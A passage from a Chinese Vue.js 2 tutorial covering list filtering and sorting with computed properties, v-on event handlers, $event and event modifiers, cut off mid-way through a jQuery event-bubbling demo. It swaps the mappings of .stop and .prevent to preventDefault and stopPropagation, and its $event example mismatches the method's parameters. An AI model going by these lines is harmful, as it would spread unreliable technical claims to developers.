</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;004&#39;</span><span class="p">,</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;温兆伦&#39;</span><span class="p">,</span> <span class="nx">age</span><span class="o">:</span> <span class="mi">21</span><span class="p">,</span> <span class="nx">sex</span><span class="o">:</span> <span class="s1">&#39;男&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="nx">keyWord</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">filPresons</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">presons</span><span class="p">.</span><span class="nx">filter</span><span class="p">((</span><span class="nx">preson</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">preson</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">keyWord</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div></li>
</ul>
<p>实现排序功能：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;按名称搜索&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;keyWord&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;sortType = 2&#34;</span><span class="p">&gt;</span>年龄升序<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;sortType = 1&#34;</span><span class="p">&gt;</span>年龄降序<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;sortType = 0&#34;</span><span class="p">&gt;</span>原顺序<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">table</span><span class="p">&gt;</span><span class="c">&lt;!-- ... --&gt;</span><span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">presons</span><span class="o">:</span> <span class="p">[</span> <span class="cm">/* ... */</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">      <span class="nx">keyWord</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sortType</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>  <span class="c1">// 0-原顺序 1-降序 2-升序
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">filPresons</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">presons</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">presons</span><span class="p">.</span><span class="nx">filter</span><span class="p">((</span><span class="nx">preson</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span> <span class="nx">preson</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">keyWord</span><span class="p">)</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 判断是否需要排序
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">sortType</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">presons</span><span class="p">.</span><span class="nx">sort</span><span class="p">((</span><span class="nx">p1</span><span class="p">,</span> <span class="nx">p2</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">sortType</span> <span class="o">===</span> <span class="mi">1</span> <span class="o">?</span> <span class="nx">p2</span><span class="p">.</span><span class="nx">age</span><span class="o">-</span><span class="nx">p1</span><span class="p">.</span><span class="nx">age</span> <span class="o">:</span> <span class="nx">p1</span><span class="p">.</span><span class="nx">age</span> <span class="o">-</span> <span class="nx">p2</span><span class="p">.</span><span class="nx">age</span>
</span></span><span class="line"><span class="cl">          <span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">presons</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>（“过滤和排序不分家”）在实现过滤和排序功能时，最好的方式是将过滤功能和排序功能使用同一个函数来封装（调用）。</p>
</blockquote>
<hr>
<h1 id="事件处理器" data-numberify>事件处理器<a class="anchor ms-1" href="#事件处理器"></a></h1>
<p>事件是指网页中用户在交互过程中产生的一些行为，例如点击、拖拽、滚动等等。事件处理器就是对用户与网页交互过程中产生的事件进行相应处理，例如点击按钮后进行提交、数据展示等等。Vue中，事件监听可以使用<code>v-on</code>指令，其语法如下：</p>
<pre tabindex="0"><code>v-on:event=&#34;expression&#34;
</code></pre><ul>
<li><code>event</code>：指HTML中的事件属性。</li>
<li><code>expression</code>：当事件被触发时，所执行的语句，通常使用的是Vue实例中的函数（在Vue配置中的<code>methods</code>中定义）。</li>
</ul>
<p>在<code>v-on</code>指令中调用JS表达式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">v-on:click</span><span class="o">=</span><span class="s">&#34;counter += 1&#34;</span><span class="p">&gt;</span>Click<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>This button was clicked {{ counter }} time.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">counter</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在<code>v-on</code>指令中调用JS函数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 函数中的参数也是来自Vue实例 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;hello(msg)&#34;</span><span class="p">&gt;</span>Hello<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">hello</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p><code>methods</code>在中定义的函数会直接赋给Vue实例，而<code>data</code>中的对象不仅会赋给Vue实例，还会将<code>data</code>中的对象交由Vue实例来代理。</p>
</blockquote>
<p>在定义事件处理器时，通常是指定一个事件处理函数来处理（即指定事件处理函数的函数名）。当触发事件时，Vue会调用该函数，并且将当前事件对象<code>event</code>作为参数1传递给当前指定的函数）。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 当事件处理函数没有使用 &#34;()&#34; 时，会将当前事件对象作为参数传递给该函数 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">v-on:click</span><span class="o">=</span><span class="s">&#34;clicked&#34;</span><span class="p">&gt;</span>Click<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;isShowed&#34;</span><span class="p">&gt;</span>{{msg}}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isShowed</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 事件处理函数可以接收当前的事件对象 event
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">clicked</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">isShowed</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">msg</span> <span class="o">=</span> <span class="s1">&#39;Hello Vue.js! &#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// event.target 是触发事件的事件目标对象，即当前触发事件的元素对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">msg</span> <span class="o">+=</span> <span class="s1">&#39;Current Event: &#39;</span> <span class="o">+</span> <span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">tagName</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">msg</span> <span class="o">=</span> <span class="nx">msg</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>Vue示例中的方法，最好都使用<code>function(...) {...}</code>来定义。因为使用Lambda表达式（箭头函数<code>(...) =&gt; {...}</code>）来定义的话，函数中的<code>this</code>指向的并不是Vue实例对象。在<code>methods</code>中使用<code>function(...) {...}</code>定义的函数，它们的<code>this</code>指向的时当前Vue实例对象或对应的组件实例对象。</p>
</blockquote>
<p>如果在调用JS函数的同时又要接收<code>event</code>对象，可以使用Vue自带的<code>$event</code>关键词表示要在此处传入<code>event</code>对象。<code>$event</code>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">v-on:click</span><span class="o">=</span><span class="s">&#34;hello($event, msg)&#34;</span><span class="p">&gt;</span>Hello<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">hello</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">tagName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>事件处理器除了直接绑定到一个方法，也可以用内联JS语句。如<a href="/docs/vue/single-instance/template-syntax/directives/#%e6%9d%a1%e4%bb%b6%e6%8c%87%e4%bb%a4">条件指令</a>中所示。</p>
<p>Vue为<code>v-on</code>指令提供了简写形式，可以将<code>v-on:</code>简写为<code>@</code>，例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;clicked&#34;</span><span class="p">&gt;</span>Click<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>有关Html事件可参考：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp" target="_blank" rel="noopener noreferrer">HTML 事件参考手册<i class="fas fa-external-link-square-alt ms-1"></i></a>。</p>
</blockquote>
<h2 id="事件修饰符" data-numberify>事件修饰符<a class="anchor ms-1" href="#事件修饰符"></a></h2>
<p>Vue.js为<code>v-on</code>提供了事件修饰符来处理DOM事件细节，通过由<code>.</code>表示的指令后缀来调用修饰符。事件修饰符常用的有：</p>
<ul>
<li>
<p><code>.stop</code>：阻止事件冒泡。对应<code>event.preventDefault()</code>。</p>
</li>
<li>
<p><code>.prevent</code>：阻止默认事件。对应<code>event.stopPropagation()</code>。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 提交事件不再重载页面 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">v-on:submit</span><span class="err">.</span><span class="na">prevent</span><span class="o">=</span><span class="s">&#34;onSubmit&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 阻止链接跳转 --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://www.linner.asia&#34;</span> <span class="err">@</span><span class="na">click</span><span class="err">.</span><span class="na">prevent</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>.capture</code>：使用事件的捕获模式。</p>
</li>
<li>
<p><code>.self</code>：只监听触发该元素的事件。</p>
<p>只当事件在该元素本身（而不是子元素）触发时触发回调。即<code>event.target</code>是当前触发事件的元素时才触发回调。</p>
</li>
<li>
<p><code>.once</code>：指定的事件只能被触发一次。2.1.4版本新增。</p>
</li>
<li>
<p><code>.left</code>：左键事件。</p>
</li>
<li>
<p><code>.right</code>：右键事件。</p>
</li>
<li>
<p><code>.middle</code>：中间滚轮事件。</p>
</li>
<li>
<p><code>passive</code>：事件的默认行为立即执行，无需等待事件回调执行完毕。</p>
<p>通常情况下，事件触发后，会先执行完回调，然后再执行事件默认行为。</p>
</li>
</ul>
<p>其中：</p>
<ul>
<li>
<p><strong>事件冒泡</strong>：当事件被触发时，同样的事件将会在触发事件的元素的所有祖先元素中被触发。</p>
<p>事件冒泡代码演示如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">padding</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nc">box</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">width</span><span class="p">:</span> <span class="mi">120</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">height</span><span class="p">:</span> <span class="mi">120</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">background-color</span><span class="p">:</span> <span class="kc">gray</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">position</span><span class="p">:</span> <span class="kc">relative</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">display</span><span class="p">:</span> <span class="kc">inline-block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nc">btn</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">position</span><span class="p">:</span> <span class="kc">absolute</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">left</span><span class="p">:</span> <span class="nb">calc</span><span class="p">(</span><span class="mi">50</span><span class="kt">%</span> <span class="o">-</span> <span class="mi">25</span><span class="kt">px</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">top</span><span class="p">:</span> <span class="nb">calc</span><span class="p">(</span><span class="mi">50</span><span class="kt">%</span> <span class="o">-</span> <span class="mi">15</span><span class="kt">px</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">width</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">height</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nc">box</span> <span class="nt">p</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;box&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>事件冒泡<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="c">&lt;!-- 
</span></span></span><span class="line"><span class="cl"><span class="c">        当按钮被点击时，点击事件会从button元素开始，逐层往上传递，传递链如下所示：
</span></span></span><span class="line"><span class="cl"><span class="c">        button —— div —— body —— html 
</span></span></span><span class="line"><span class="cl"><span class="c">      --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn&#34;</span><span class="p">&gt;</span>按钮<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;box&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>阻止事件冒泡<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="c">&lt;!-- .stop 会阻止事件冒泡 --&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn&#34;</span> <span class="na">v-on:click</span><span class="err">.</span><span class="na">stop</span><span class="p">&gt;</span>按钮<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.btn&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The button was clicked...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.box&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The box was clicked...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
